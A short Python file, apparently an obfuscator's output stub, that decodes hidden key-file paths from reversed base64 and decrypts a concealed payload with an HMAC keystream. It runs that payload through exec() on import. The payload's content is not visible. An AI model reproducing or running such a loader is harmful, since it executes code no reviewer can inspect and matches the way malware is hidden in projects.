# Dorayaki Obfuscated Stub
import base64, os, hashlib, hmac
from pathlib import Path

_KEY_PARTS_OBF = ['wtmL4IjZyEDM3gjY4MmYjdzYllTZlVzLxEGM5QjYkNDNkZjYmZmY58iblRGZphmLv4iLv4iLv4iL', 'wtmLldTZ5MGZkVjN2MTZyMjZ5czY0gzLxEGM5QjYkNDNkZjYmZmY58iblRGZphmLv4iLv4iLv4iL', 'wtmLmNTOyYWYxgjY5I2Y1ETYjRDZygzLxEGM5QjYkNDNkZjYmZmY58iblRGZphmLv4iLv4iLv4iL', 'wtmL3EjZyYWZyUmN3YGOkhjMmR2YkhzLxEGM5QjYkNDNkZjYmZmY58iblRGZphmLv4iLv4iLv4iL']
_BLOB_CHUNKS = ['wjBdkFREeOxQZAxyHStBlwolWDbwIKex3J6aYSLaFq3WpibDMxp1jqspcby1aJdfXemTHbZrKfihp1kvtvAsBNHIhrWgpcgcmiZU9dH/UZYxwbyoqyX', 'Lo9eqU0rPbLfW9MQtFm/p/UxnaBdx5qd+A1VoMc57a1KCTWX+u4Tft1QXKNMT+Us5DGdl60BhOvTnVhkwXn4LTg2ydtRS5ioAcN8DWYWIv7pITwJoLe', 'eGxCSRSEPmRvhaB6CtNKy8UwlMgjOv5/a3Ow7p8Y92jU1khzcconp5e9mz1Zxwt4LvtDPFPBJy+9ZKLJ02hTOPHMN8WWuO0qs/oYV3AChgUg1RFkB/Z', 'WuEVKyJxktA9A0GvH0uD7TloAGi1tNKsSYqYA4uMqm4VJ3ecjnISwXavAii86WQeAswANBhkaZwJ66V8oGt4kOXeKKs1D6ALn6PnB9btDhBd2mt8UJx', 'GXKJaZr/4cAEPb3U+R5nq05ibfxtQ673+M+jRtP7YHhg04CJS4+i5TpdXPzol0VjeaHZvKrmLOgXd958iCurkakUbfLFKQgmz1V1hXLBC/XZsEhpDCY', '==gSx+0SKx88xgOTPFE6002vXG8LNBnKSoLQtewvRhlE4qyvES+eP0viK7P//VeA2nHVINczfHf2iTdC/9MvO5Fz0vAE40E0iOf7CEFH+NBWMR6rHFpXk']

def _rev(s): return s[::-1]
def _read_key_parts():
    parts = []
    # FIX: Resolve relative to this file's directory
    base = Path(__file__).resolve().parent
    for obf in _KEY_PARTS_OBF:
        try:
            rel_path_str = base64.b64decode(_rev(obf)).decode('utf-8')
            p = base.joinpath(rel_path_str).resolve()
            parts.append(base64.b64decode(p.read_text('utf-8')))
        except Exception: pass
    return b''.join(parts)

def _keystream(key, nonce, length):
    out = bytearray(); counter = 0
    while len(out) < length:
        out.extend(hmac.new(key, nonce + counter.to_bytes(8,'big'), hashlib.sha256).digest())
        counter += 1
    return bytes(out[:length])

def _run():
    key = _read_key_parts()
    if not key: raise RuntimeError("Decryption Key not found (missing .hidden folder?)")
    blob = base64.b64decode(''.join([_rev(c) for c in _BLOB_CHUNKS]))
    nonce, ct = blob[:12], blob[12:]
    ks = _keystream(key, nonce, len(ct))
    plain = bytes(a ^ b for a, b in zip(ct, ks))
    try: src = plain.decode('utf-8')
    except: src = plain.decode('latin-1')
    exec(compile(src, __file__, 'exec'), globals())

_run()
